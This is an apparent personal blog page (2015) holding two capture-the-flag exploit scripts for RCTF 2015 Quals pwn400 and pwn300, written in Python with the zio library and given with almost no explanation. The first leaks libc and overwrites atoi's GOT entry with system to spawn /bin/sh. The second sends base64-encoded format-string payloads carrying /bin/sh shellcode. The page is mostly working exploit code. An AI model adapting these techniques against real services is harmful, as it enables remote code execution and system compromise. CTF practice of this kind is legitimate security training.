      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/17/RCTF-2015-Quals-pwn400/">RCTF_2015_Quals_pwn400</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/shaxian_51f320b11793463ecdcfbb0c015cc273">shaxian_51f320b11793463ecdcfbb0c015cc273</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">host = &apos;127.0.0.1&apos;</span><br><span class="line">port = 23333</span><br><span class="line"></span><br><span class="line">#io = zio((host,port),timeout=100000,print_read=COLORED(REPR,&quot;yellow&quot;),\</span><br><span class="line">#	print_write=COLORED(REPR,&quot;red&quot;))</span><br><span class="line">io = zio((host,port),timeout=5,print_read=NONE,print_write=NONE)</span><br><span class="line"></span><br><span class="line">#raw_input()</span><br><span class="line"></span><br><span class="line">def order(s,how=&apos;32&apos;):</span><br><span class="line">	global io</span><br><span class="line">	io.read_until(&apos;choose:\n&apos;)</span><br><span class="line">	io.writeline(&apos;1&apos;)</span><br><span class="line">	io.read_until(&apos;5.Jianjiao\n&apos;)</span><br><span class="line">	io.writeline(s)</span><br><span class="line">	io.read_until(&apos;How many?\n&apos;)</span><br><span class="line">	io.writeline(how)</span><br><span class="line"></span><br><span class="line">got_puts      = 0x804b02c</span><br><span class="line">got_atoi      = 0x804b038</span><br><span class="line">offset_puts   = 0x0064d20</span><br><span class="line">offset_atoi   = 0x002f7f0</span><br><span class="line">offset_system = 0x003e360</span><br><span class="line"></span><br><span class="line"># message</span><br><span class="line">io.read_until(&apos;Your Address:\n&apos;)</span><br><span class="line">io.writeline(l32(0)+l32(0x31))</span><br><span class="line">io.read_until(&apos;Your Phone number:\n&apos;)</span><br><span class="line">io.writeline(l32(0)*60+l32(0)+l32(0x31))</span><br><span class="line"></span><br><span class="line"># Leak libc</span><br><span class="line">order(&apos;a&apos;*28+&apos;\x00&apos;*4+l32(got_puts))</span><br><span class="line">io.read_until(&apos;choose:\n&apos;)</span><br><span class="line">io.writeline(&apos;4&apos;)</span><br><span class="line">io.read_until(&apos;-&apos;)</span><br><span class="line">libc_base = 0xffffffff-int(io.read(9))+1-offset_puts</span><br><span class="line">print &apos;[ Libc is ] &apos;+hex(libc_base)</span><br><span class="line"></span><br><span class="line">order(&apos;b&apos;*28+&apos;\x00&apos;*4+l32(0x804b1b8))</span><br><span class="line">io.read_until(&apos;choose:\n&apos;)</span><br><span class="line">io.writeline(&apos;2&apos;)</span><br><span class="line">io.read_until(&apos;choose:\n&apos;)</span><br><span class="line">io.writeline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line">system = libc_base+offset_system-0xffffffff-1</span><br><span class="line">order(l32(0)+l32(got_atoi),how=str(system))</span><br><span class="line"></span><br><span class="line">io.read_until(&apos;choose:\n&apos;)</span><br><span class="line">print &apos;Enjoy your shell~!&apos;</span><br><span class="line">io.writeline(&apos;/bin/sh&apos;)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-RCTF-2015-Quals-pwn300" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/17/RCTF-2015-Quals-pwn300/" class="article-date">
  	<time datetime="2015-11-17T07:50:51.000Z" itemprop="datePublished">2015-11-17</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/17/RCTF-2015-Quals-pwn300/">RCTF-2015-Quals-pwn300</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/nobug_acc0c1b37bec49e0575c94a3916cc771">nobug_acc0c1b37bec49e0575c94a3916cc771</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line">from base64 import b64encode</span><br><span class="line"></span><br><span class="line">host = &apos;127.0.0.1&apos;</span><br><span class="line">port = 2333</span><br><span class="line">target = (host,port)</span><br><span class="line"></span><br><span class="line">shellcode = (  # /bin/sh shellcode at http://shell-storm.org/shellcode/files/shellcode-236.php</span><br><span class="line">  &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f&quot;</span><br><span class="line">        &quot;\x73\x68\x68\x2f\x62\x69\x6e\x54&quot;</span><br><span class="line">        &quot;\x5b\x52\x53\x54\x59\x0f\x34&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io = zio(target,timeout=2333)</span><br><span class="line">#raw_input()</span><br><span class="line">io.writeline(b64encode(&apos;%4$x&apos;))</span><br><span class="line">ebp = (int(io.read(8),16)-0x1c) &amp; 0xffff</span><br><span class="line">io.writeline(b64encode(shellcode+&apos;%&apos;+str(ebp-len(shellcode))+&apos;x%4$hn&apos;))</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2016 b1gtang
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>